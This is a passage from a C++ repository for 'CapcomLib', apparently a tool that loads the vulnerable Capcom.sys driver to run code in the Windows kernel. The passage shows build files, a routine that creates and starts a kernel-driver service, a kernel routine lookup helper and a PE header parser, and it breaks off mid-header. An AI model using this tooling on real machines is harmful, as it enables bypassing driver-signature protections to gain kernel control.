Project Path: arc_gmh5225_CapcomLib_y7yxnpr9

Source Tree:

```txt
arc_gmh5225_CapcomLib_y7yxnpr9
├── Capcom.sys
├── CapcomLib
│   ├── CapcomLib.vcxproj
│   ├── CapcomLib.vcxproj.filters
│   ├── DriverLoader.cpp
│   ├── DriverLoader.h
│   ├── KernelHelp.cpp
│   ├── KernelHelp.h
│   ├── PEFile.cpp
│   ├── PEFile.h
│   ├── PELoader.cpp
│   ├── PELoader.h
│   ├── Util.h
│   ├── VulnDrivers
│   │   ├── BaseVulnDriver.cpp
│   │   ├── BaseVulnDriver.h
│   │   ├── CapcomDriver.cpp
│   │   ├── CapcomDriver.h
│   │   ├── IVulnDriver.h
│   │   └── stdafx.h
│   ├── Win32Kernel.h
│   ├── Win32Util.h
│   ├── main.cpp
│   ├── stdafx.cpp
│   ├── stdafx.h
│   └── targetver.h
├── CapcomLib.sln
├── HelloWorldPE
│   ├── HelloWorldPE.cpp
│   ├── HelloWorldPE.vcxproj
│   ├── HelloWorldPE.vcxproj.filters
│   ├── ReadMe.txt
│   ├── stdafx.cpp
│   ├── stdafx.h
│   └── targetver.h
├── README.md
├── SimpleDriver
│   ├── Driver.c
│   ├── SimpleDriver.inf
│   ├── SimpleDriver.vcxproj
│   └── SimpleDriver.vcxproj.filters
└── TestDriver
    ├── Driver.c
    ├── TestDriver.inf
    ├── TestDriver.vcxproj
    └── TestDriver.vcxproj.filters

```

`CapcomLib.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio 15
VisualStudioVersion = 15.0.27130.2027
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "CapcomLib", "CapcomLib\CapcomLib.vcxproj", "{F23D02FE-59C5-40B4-8E21-0DD02C67B74A}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "HelloWorldPE", "HelloWorldPE\HelloWorldPE.vcxproj", "{5E259D52-721C-4B7B-93F0-7D8273832E4A}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "TestDriver", "TestDriver\TestDriver.vcxproj", "{3DA1B750-594A-40C9-A958-A9C9C7F964FD}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|ARM = Debug|ARM
		Debug|ARM64 = Debug|ARM64
		Debug|x64 = Debug|x64
		Debug|x86 = Debug|x86
		Release|ARM = Release|ARM
		Release|ARM64 = Release|ARM64
		Release|x64 = Release|x64
		Release|x86 = Release|x86
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{F23D02FE-59C5-40B4-8E21-0DD02C67B74A}.Debug|ARM.ActiveCfg = Debug|Win32
		{F23D02FE-59C5-40B4-8E21-0DD02C67B74A}.Debug|ARM64.ActiveCfg = Debug|Win32
		{F23D02FE-59C5-40B4-8E21-0DD02C67B74A}.Debug|x64.ActiveCfg = Debug|x64
		{F23D02FE-59C5-40B4-8E21-0DD02C67B74A}.Debug|x64.Build.0 = Debug|x64
		{F23D02FE-59C5-40B4-8E21-0DD02C67B74A}.Debug|x64.Deploy.0 = Debug|x64
		{F23D02FE-59C5-40B4-8E21-0DD02C67B74A}.Debug|x86.ActiveCfg = Debug|Win32
		{F23D02FE-59C5-40B4-8E21-0DD02C67B74A}.Debug|x86.Build.0 = Debug|Win32
		{F23D02FE-59C5-40B4-8E21-0DD02C67B74A}.Release|ARM.ActiveCfg = Release|Win32
		{F23D02FE-59C5-40B4-8E21-0DD02C67B74A}.Release|ARM64.ActiveCfg = Release|Win32
		{F23D02FE-59C5-40B4-8E21-0DD02C67B74A}.Release|x64.ActiveCfg = Release|x64
		{F23D02FE-59C5-40B4-8E21-0DD02C67B74A}.Release|x64.Build.0 = Release|x64
		{F23D02FE-59C5-40B4-8E21-0DD02C67B74A}.Release|x86.ActiveCfg = Release|Win32
		{F23D02FE-59C5-40B4-8E21-0DD02C67B74A}.Release|x86.Build.0 = Release|Win32
		{5E259D52-721C-4B7B-93F0-7D8273832E4A}.Debug|ARM.ActiveCfg = Debug|Win32
		{5E259D52-721C-4B7B-93F0-7D8273832E4A}.Debug|ARM64.ActiveCfg = Debug|Win32
		{5E259D52-721C-4B7B-93F0-7D8273832E4A}.Debug|x64.ActiveCfg = Release|x64
		{5E259D52-721C-4B7B-93F0-7D8273832E4A}.Debug|x86.ActiveCfg = Debug|Win32
		{5E259D52-721C-4B7B-93F0-7D8273832E4A}.Debug|x86.Build.0 = Debug|Win32
		{5E259D52-721C-4B7B-93F0-7D8273832E4A}.Release|ARM.ActiveCfg = Release|Win32
		{5E259D52-721C-4B7B-93F0-7D8273832E4A}.Release|ARM64.ActiveCfg = Release|Win32
		{5E259D52-721C-4B7B-93F0-7D8273832E4A}.Release|x64.ActiveCfg = Release|x64
		{5E259D52-721C-4B7B-93F0-7D8273832E4A}.Release|x64.Build.0 = Release|x64
		{5E259D52-721C-4B7B-93F0-7D8273832E4A}.Release|x86.ActiveCfg = Release|Win32
		{5E259D52-721C-4B7B-93F0-7D8273832E4A}.Release|x86.Build.0 = Release|Win32
		{3DA1B750-594A-40C9-A958-A9C9C7F964FD}.Debug|ARM.ActiveCfg = Debug|ARM
		{3DA1B750-594A-40C9-A958-A9C9C7F964FD}.Debug|ARM.Build.0 = Debug|ARM
		{3DA1B750-594A-40C9-A958-A9C9C7F964FD}.Debug|ARM.Deploy.0 = Debug|ARM
		{3DA1B750-594A-40C9-A958-A9C9C7F964FD}.Debug|ARM64.ActiveCfg = Debug|ARM64
		{3DA1B750-594A-40C9-A958-A9C9C7F964FD}.Debug|ARM64.Build.0 = Debug|ARM64
		{3DA1B750-594A-40C9-A958-A9C9C7F964FD}.Debug|ARM64.Deploy.0 = Debug|ARM64
		{3DA1B750-594A-40C9-A958-A9C9C7F964FD}.Debug|x64.ActiveCfg = Debug|x64
		{3DA1B750-594A-40C9-A958-A9C9C7F964FD}.Debug|x64.Build.0 = Debug|x64
		{3DA1B750-594A-40C9-A958-A9C9C7F964FD}.Debug|x86.ActiveCfg = Debug|Win32
		{3DA1B750-594A-40C9-A958-A9C9C7F964FD}.Debug|x86.Build.0 = Debug|Win32
		{3DA1B750-594A-40C9-A958-A9C9C7F964FD}.Debug|x86.Deploy.0 = Debug|Win32
		{3DA1B750-594A-40C9-A958-A9C9C7F964FD}.Release|ARM.ActiveCfg = Release|ARM
		{3DA1B750-594A-40C9-A958-A9C9C7F964FD}.Release|ARM.Build.0 = Release|ARM
		{3DA1B750-594A-40C9-A958-A9C9C7F964FD}.Release|ARM.Deploy.0 = Release|ARM
		{3DA1B750-594A-40C9-A958-A9C9C7F964FD}.Release|ARM64.ActiveCfg = Release|ARM64
		{3DA1B750-594A-40C9-A958-A9C9C7F964FD}.Release|ARM64.Build.0 = Release|ARM64
		{3DA1B750-594A-40C9-A958-A9C9C7F964FD}.Release|ARM64.Deploy.0 = Release|ARM64
		{3DA1B750-594A-40C9-A958-A9C9C7F964FD}.Release|x64.ActiveCfg = Release|x64
		{3DA1B750-594A-40C9-A958-A9C9C7F964FD}.Release|x64.Build.0 = Release|x64
		{3DA1B750-594A-40C9-A958-A9C9C7F964FD}.Release|x64.Deploy.0 = Release|x64
		{3DA1B750-594A-40C9-A958-A9C9C7F964FD}.Release|x86.ActiveCfg = Release|Win32
		{3DA1B750-594A-40C9-A958-A9C9C7F964FD}.Release|x86.Build.0 = Release|Win32
		{3DA1B750-594A-40C9-A958-A9C9C7F964FD}.Release|x86.Deploy.0 = Release|Win32
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {D1B457AB-CFDA-49AD-840E-1668802F8477}
	EndGlobalSection
EndGlobal

```

`CapcomLib/CapcomLib.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <ProjectGuid>{F23D02FE-59C5-40B4-8E21-0DD02C67B74A}</ProjectGuid>
    <Keyword>Win32Proj</Keyword>
    <RootNamespace>CapcomLib</RootNamespace>
    <WindowsTargetPlatformVersion>10.0.15063.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <PrecompiledHeader>
      </PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Disabled</Optimization>
      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <AdditionalDependencies>Shlwapi.lib;kernel32.lib;user32.lib;gdi32.lib;winspool.lib;comdlg32.lib;advapi32.lib;shell32.lib;ole32.lib;oleaut32.lib;uuid.lib;odbc32.lib;odbccp32.lib;%(AdditionalDependencies)</AdditionalDependencies>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <PrecompiledHeader>Create</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Disabled</Optimization>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <LanguageStandard>stdcpplatest</LanguageStandard>
      <RuntimeLibrary>MultiThreadedDebug</RuntimeLibrary>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <AdditionalDependencies>shlwapi.lib;kernel32.lib;user32.lib;gdi32.lib;winspool.lib;comdlg32.lib;advapi32.lib;shell32.lib;ole32.lib;oleaut32.lib;uuid.lib;odbc32.lib;odbccp32.lib;%(AdditionalDependencies)</AdditionalDependencies>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <PrecompiledHeader>
      </PrecompiledHeader>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <PrecompiledHeader>
      </PrecompiledHeader>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClInclude Include="VulnDrivers\BaseVulnDriver.h" />
    <ClInclude Include="DriverLoader.h" />
    <ClInclude Include="VulnDrivers\IVulnDriver.h" />
    <ClInclude Include="Util.h" />
    <ClInclude Include="KernelHelp.h" />
    <ClInclude Include="PEFile.h" />
    <ClInclude Include="PELoader.h" />
    <ClInclude Include="stdafx.h" />
    <ClInclude Include="targetver.h" />
    <ClInclude Include="VulnDrivers\CapcomDriver.h" />
    <ClInclude Include="VulnDrivers\stdafx.h" />
    <ClInclude Include="Win32Util.h" />
    <ClInclude Include="Win32Kernel.h" />
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="VulnDrivers\BaseVulnDriver.cpp" />
    <ClCompile Include="main.cpp" />
    <ClCompile Include="DriverLoader.cpp" />
    <ClCompile Include="KernelHelp.cpp" />
    <ClCompile Include="PEFile.cpp" />
    <ClCompile Include="PELoader.cpp" />
    <ClCompile Include="stdafx.cpp" />
    <ClCompile Include="VulnDrivers\CapcomDriver.cpp" />
  </ItemGroup>
  <ItemGroup>
    <None Include="..\Capcom.sys" />
  </ItemGroup>
  <ItemGroup>
    <Content Include="..\Capcom.sys">
      <CopyToOutputDirectory>PreserveNewest</CopyToOutputDirectory>
    </Content>
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`CapcomLib/CapcomLib.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;hm;inl;inc;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="stdafx.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="targetver.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="DriverLoader.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="PELoader.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="PEFile.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Win32Kernel.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="KernelHelp.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Win32Util.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Util.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="VulnDrivers\CapcomDriver.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="VulnDrivers\IVulnDriver.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="VulnDrivers\BaseVulnDriver.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="VulnDrivers\stdafx.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="stdafx.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="DriverLoader.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="PELoader.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="PEFile.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="KernelHelp.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="main.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="VulnDrivers\CapcomDriver.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="VulnDrivers\BaseVulnDriver.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <None Include="..\Capcom.sys" />
  </ItemGroup>
</Project>
```

`CapcomLib/DriverLoader.cpp`:

```cpp
#include "stdafx.h"
#include "DriverLoader.h"
#include "Util.h"
#include "VulnDrivers\BaseVulnDriver.h"

void DriverLoader::MakeService(const std::wstring& DriverPath, const std::wstring& DisplayName)
{
	auto csDriverPath = DriverPath.c_str();
	if (!PathFileExists(csDriverPath))
	{
		Util::Exception::Throw("File not found: %S", csDriverPath);
	}

	SC_HANDLE hSCManager;
	SC_HANDLE hService;

	// Open Service Control Manager handle. We must create a service for the driver in order for the OS to load it.
	hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
	if (!hSCManager) Util::Exception::ThrowLastError(L"OpenSCManager");

	// Create the service.
	hService = CreateService(hSCManager, DisplayName.c_str(), DisplayName.c_str(), SERVICE_START | DELETE | SERVICE_STOP, \
		SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, csDriverPath, NULL, NULL, NULL, NULL, NULL);

	// If the service already exists on the system, simply use that service instead
	if (!hService)
	{
		hService = OpenService(hSCManager, DisplayName.c_str(), SERVICE_START | DELETE | SERVICE_STOP);
	}

	if (!hService) Util::Exception::ThrowLastError(L"OpenService");

	// Start the service. This ensures that module is loaded.
	StartServiceW(hService, 0, NULL);

	CloseServiceHandle(hService);

	CloseServiceHandle(hSCManager);
}

void DriverLoader::RemoveServiceIfExists(const std::wstring& DisplayName)
{
	SERVICE_STATUS status;

	auto manager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);

	if (manager == NULL) Util::Exception::ThrowLastError("OpenSCManager");
	
	auto service = OpenService(manager, DisplayName.c_str(), SERVICE_ALL_ACCESS);

	if (service == NULL)
	{
		CloseServiceHandle(manager);
		return;
	}

	if (!ControlService(service, SERVICE_CONTROL_STOP, &status))
	{
		CloseServiceHandle(manager);
		CloseServiceHandle(service);
		return;
	}

	CloseServiceHandle(manager);
	CloseServiceHandle(service);
}

```

`CapcomLib/DriverLoader.h`:

```h
#pragma once
#include "stdafx.h"
#include "Win32Kernel.h"
#include "PELoader.h"

namespace DriverLoader
{
	// Create registry entries and attempt to load a driver from the given path
	void MakeService(const std::wstring& DriverPath, const std::wstring& DisplayName);

	// Stops the service and unloads the driver
	void RemoveServiceIfExists(const std::wstring& DisplayName);
}



```

`CapcomLib/KernelHelp.cpp`:

```cpp
#include "stdafx.h"
#include "KernelHelp.h"

```

`CapcomLib/KernelHelp.h`:

```h
#pragma once

#include "stdafx.h"
#include "Win32Kernel.h"

#define K_GetRoutine(_NAME) \
	KernelHelp::GetRoutineAddr<_NAME##Func>(_MmGetSystemRoutineAddress, L#_NAME)

class KernelHelp
{
public:
	/// Grabs a function address in the kernel using MmGetSystemRoutineAddress
	template<class T>
	static T GetRoutineAddr(MmGetSystemRoutineFunc _MmGetSystemRoutine, const TCHAR* RoutineName)
	{
		UNICODE_STRING LocalRoutineName = {};
		RtlInitUnicodeString(&LocalRoutineName, RoutineName);
		return reinterpret_cast<T>(_MmGetSystemRoutine(&LocalRoutineName));
	}

};
```

`CapcomLib/PEFile.cpp`:

```cpp
#include "stdafx.h"
#include "PEFile.h"
#include "Win32Util.h"
#include "Util.h"
using namespace std;


PEFile::PEFile(const std::wstring & Filename)
{
	LoadFromFile(Filename);
	ParsePEHeaders();
}

PEFile::PEFile(PVOID PEFileMemoryBase, SIZE_T PEFileMemorySize)
{
	m_FileMemoryBase = PEFileMemoryBase;
	m_FileMemoryEnd = MakePointer<PVOID>(m_FileMemoryBase, PEFileMemorySize);
	ParsePEHeaders();
}

PEFile::PEFile(Util::Win32::unique_module Module)
{
	auto hModule = (HMODULE) Module.get();
	m_LoadedModule = move(Module);
	m_FileMemoryBase = hModule;

	ParsePEHeaders();

	m_FileMemoryEnd = MakePointer<PVOID>(m_FileMemoryBase, GetImageSize());
}

SIZE_T PEFile::GetTotalMappedSize()
{
	// NOTE: Probably can't trust this
	return m_SizeOfImage;
}

PEFile::~PEFile()
{
}

VOID PEFile::LoadFromFile(const wstring& Filename)
{
	// Open file readonly
	auto hFile = Util::Win32::unique_handle
	{
		CreateFile(Filename.c_str(), FILE_GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
		NULL, OPEN_EXISTING, 0, NULL)
	};
	if (hFile.get() <= 0LL) Util::Exception::ThrowLastError("CreateFile");

	// Get size of the image file
	auto dwFileSizeHigh = DWORD{};
	auto dwFileSizeLow = GetFileSize(hFile.get(), &dwFileSizeHigh);
	if (dwFileSizeLow == INVALID_FILE_SIZE) Util::Exception::ThrowLastError("GetFileSize");
	
	auto dwFileSize = DWORD64{ dwFileSizeHigh | dwFileSizeLow };

	// Create the file mapping (NOTE: Doing this manually, not as SEC_IMAGE, requires moving the sections manually)
	auto hMap = Util::Win32::unique_handle
	{
		CreateFileMapping(hFile.get(), NULL, PAGE_READONLY, 0, 0, NULL)
	};
	if (hMap.get() <= 0LL) Util::Exception::ThrowLastError("CreateFileMapping");

	// Create the view of the entire file
	auto PEFile = MapViewOfFile(hMap.get(), FILE_MAP_READ, 0, 0, 0);
	if (PEFile <= 0LL) Util::Exception::ThrowLastError("MapViewOfFile");

	// Commit the handles
	m_FileHandle = move(hFile);
	m_FileMapping = move(hMap);
	m_FileMemoryBase = PEFile;
	m_FileMemoryEnd = MakePointer<PVOID>(PEFile, dwFileSize);

}



// Loader process based off of Blackbone
// https://github.com/DarthTon/Blackbone/blob/master/src/BlackBone/PE/PEImage.cpp
VOID PEFile::ParsePEHeaders()
{
	// Ensure valid base address (i.e. module has been loaded into memory)
	if (!m_FileMemoryBase) Util::Exception::Throw("No module loaded");

	// DOS headers are at the very beginning of the PE file. Check signature!
	auto DosHeader = MakePointer<PIMAGE_DOS_HEADER>(m_FileMemoryBase);
	if (DosHeader->e_magic != IMAGE_DOS_SIGNATURE)
	{
		Util::Exception::Throw("Invalid image DOS signature");
	}

	// DOS headers give offset to NT headers
	auto NtHeaderOffset = DosHeader->e_lfanew;

	// Grab NT headers and verify signature
	auto NtHeaders = MakePointer<PIMAGE_NT_HEADERS64>(DosHeader, NtHeaderOffset);
	if (NtHeaders->Signature != IMAGE_NT_SIGNATURE)
	{
		Util::Exception::Throw("Invalid image NT signature");
	}


	PIMAGE_SECTION_HEADER pSectionHeaders = nullptr;

	// I like this method of using a lambda for 32/64 switch, so I stole it
	// auto _NtHeaders will be either 32 or 64 bit depending on the optional headers below
	auto ParseHeaderFields = [this, &pSectionHeaders](auto _NtHeaders)
	{
		auto OptHdr = _NtHeaders->OptionalHeader;

		m_ImageBase = OptHdr.ImageBase;
		m_SizeOfImage = OptHdr.SizeOfImage;
		m_SizeOfHeaders = OptHdr.SizeOfHeaders;
		m_AddressOfEntryPointRVA = OptHdr.AddressOfEntryPoint;
		m_DllCharacteristics = OptHdr.DllCharacteristics;

		for (size_t i = 0; i < IMAGE_NUMBEROF_DIRECTORY_ENTRIES; i++)
		{
			m_Directories.push_back(_NtHeaders->OptionalHeader.DataDirectory[i]);
		}

		// Section headers follow directly after NtHeaders
		pSectionHeaders = MakePointer<PIMAGE_SECTION_HEADER>(_NtHeaders, sizeof(*_NtHeaders));
	};

	// Load headers depending on 32-bit or 64-bit
	if (NtHeaders->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC)
	{
		m_Is64 = TRUE;
		ParseHeaderFields(NtHeaders);
	}
	else if(NtHeaders->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC)
	{
		auto NtHeaders32 = MakePointer<PIMAGE_NT_HEADERS32>(NtHeaders);
		m_Is64 = FALSE;
		ParseHeaderFields(NtHeaders32);
	}
	else
	{
		Util::Exception::Throw("Invalid OptionalHeader.Magic signature");
	}

	// Determine if it's an EXE or DLL
	m_IsExe = !(NtHeaders->FileHeader.Characteristics == IMAGE_FILE_DLL);

	// For relocations
	m_Characteristics = NtHeaders->FileHeader.Characteristics;

	// NOTE: No IL loading

	// Copy over memory map sections into vector
	auto numSections = NtHeaders->FileHeader.NumberOfSections;
	m_MemSections.reserve(numSections);

	for (size_t i = 0; i < numSections; i++, pSectionHeaders++)
	{
		if (pSectionHeaders >= m_FileMemoryEnd) Util::Exception::Throw("Sections extend past end of file");
		m_MemSections.push_back(*pSectionHeaders);
	}
}

```

`CapcomLib/PEFile.h`:

```h
#pragma once
#include "stdafx.h"
#include "Win32Util.h"
#include "Util.h"

// Describes a raw PE file in mapped into memory
class PEFile
{
	friend class PEFileSection;
public:
	// Load PE file from a file by mapping the file into the process VA
	PEFile(const std::wstring& Filename);

	// If the PE file is already in memory, use this one
	PEFile(PVOID PEFileMemoryBase, SIZE_T PEFileMemorySize);

	// Load a PEFile from HMODULE
	PEFile(Util::Win32::unique_module Module);

	// Get the total size of the image after mapping
	SIZE_T GetTotalMappedSize();

	// Get sections to map memory of PE
	const auto& GetSections() const
	{
		return m_MemSections;
	}

	~PEFile();


	// Calculate an offset from the base of the file
	template<typename TargetPtr>
	TargetPtr FromOffset(SIZE_T Offset) const
	{
		auto ptr = MakePointer<TargetPtr>(m_FileMemoryBase, Offset);
		if (ptr >= m_FileMemoryEnd || ptr < m_FileMemoryBase)
		{
			Util::Exception::Throw("OffsetFromBase: Invalid file offset");
		}
		return ptr;
	}

	// Get a reference to the base of the headers
	auto GetHeadersBase() const
	{
		return reinterpret_cast<const PIMAGE_DOS_HEADER&>(m_FileMemoryBase);
	}

	// Gets the size of all headers
	auto GetHeadersSize() const
	{
		return m_SizeOfHeaders;
	}

	// True if FileHeadeers has characteristics flag
	auto HasFileCharacteristic(WORD Flag) const
	{
		return (Flag & m_Characteristics);
	}

